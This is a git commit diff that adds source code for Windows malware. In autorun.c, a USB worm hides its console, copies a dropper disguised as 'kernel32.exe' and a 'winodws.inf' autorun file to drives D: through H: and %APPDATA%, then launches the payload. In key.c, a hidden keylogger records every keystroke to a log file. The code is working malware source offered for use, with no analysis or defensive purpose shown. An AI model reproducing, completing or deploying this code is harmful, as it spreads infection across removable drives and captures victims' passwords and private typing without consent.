5ebcc8f972f6bd4dc1193737129df8434c687d62
icev0 <ahmadreza775566@gmail.com>
2022-11-28 11:47:10 -0800

    main.c

--- autorun.c
+++ autorun.c
@@ -3,24 +3,24 @@
 #include <Windows.h>
 
 #define DROP_FILE_NAME "kernel32.exe"
-#define HIDE 0
+#define HIDE           0
 
-void start_checked();
 void xcp();
 
 int main(int argc, char **argv) {
     // Hide
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, HIDE);
+    // if was not copied
     if(fopen("D:\\" DROP_FILE_NAME, "r") == NULL) 
         // worm
-        xcp();
+        xcp(); // copy
     // Active the keylogger
     system("start key.exe");
+    // Active the malware
+    system("start %%APPDATA%%\\" DROP_FILE_NAME);
     return 0;
 }
-
-void start_checked(char *P_name) {}
 
 void xcp() {
     char shell[] = 
@@ -30,13 +30,13 @@ xcopy /e /y winodws.inf F:\\\n\
 xcopy /e /y winodws.inf G:\\\n\
 xcopy /e /y winodws.inf H:\\\n";
     char shell2[] =
-"xcopy /e /y "DROP_FILE_NAME" D:\\\n\
+"xcopy /e /y "DROP_FILE_NAME" %%APPDATA%%\n\
+xcopy /e /y "DROP_FILE_NAME" D:\\\n\
 xcopy /e /y "DROP_FILE_NAME" E:\\\n\
 xcopy /e /y "DROP_FILE_NAME" F:\\\n\
 xcopy /e /y "DROP_FILE_NAME" G:\\\n\
 xcopy /e /y "DROP_FILE_NAME" H:\\";
     system(shell);
     system(shell2);
-    start_checked(DROP_FILE_NAME);
     return;
 }
--- key.c
+++ key.c
@@ -1,5 +1,85 @@
+#include <stdio.h>
 #include <Windows.h>
+#include <time.h>
+
+#define LOG "log"
+
+void log(char);
 
 int main() {
-    return EXIT_SUCCESS;
+    // capture
+    char cap;
+    // time stuff
+    time_t t;
+    t = time(NULL);
+    // Hide the window
+    ShowWindow(GetConsoleWindow(), 0);
+    // Title of the log file
+    FILE *fp = fopen(LOG, "a+");
+    fprintf(fp, "[USB LOG]\nSTART_TIME: %s\n\n", ctime(&t));
+    fclose(fp);
+
+    while(1) {
+        // https://gist.github.com/patilswapnilv/7338783
+        Sleep(20); // To make sure this program doesn't steal all resources.
+        for(int i = 8; i <= 190; i++)
+            if(GetAsyncKeyState(i) == -32767)
+                log(i);
+    }
+}
+
+void log(char key) {
+    if ((key == 1) || (key == 2)) return;
+
+    FILE *fp = fopen(LOG, "a+");
+    switch ((int)key)
+    {
+    case 0x08:
+        fprintf(fp, "%s", "[BACKSPACE]");
+        break;
+    case 0x0d:
+        fprintf(fp, "%s", "\n");
+        break;
+    case 0x20:
+        fprintf(fp, "%s", " ");
+        break;
+    case VK_TAB:
+        fprintf(fp, "%s", "[TAB]");
+        break;
+    case VK_SHIFT:
+        fprintf(fp, "%s", "[SHIFT]");
+        break;
+    case VK_CONTROL:
+        fprintf(fp, "%s", "[CONTROL]");
+        break;
+    case VK_ESCAPE:
+        fprintf(fp, "%s", "[ESCAPE]");
+        break;
+    case VK_END:
+        fprintf(fp, "%s", "[END]");
+        break;
+    case VK_HOME:
+        fprintf(fp, "%s", "[HOME]");
+        break;
+    case VK_LEFT:
+        fprintf(fp, "%s", "[LEFT]");
+        break;
+    case VK_UP:
+        fprintf(fp, "%s", "[UP]");
+        break;
+    case VK_DOWN:
+        fprintf(fp, "%s", "[DOWN]");
+        break;
+    case VK_RIGHT:
+        fprintf(fp, "%s", "[RIGHT]");
+        break;
+    case 190:
+    case 110:
+        fprintf(fp, "%s", ".");
+        break;
+    default:
+        fputc(key, fp);
+        break;
+    }
+    fclose(fp);
 }
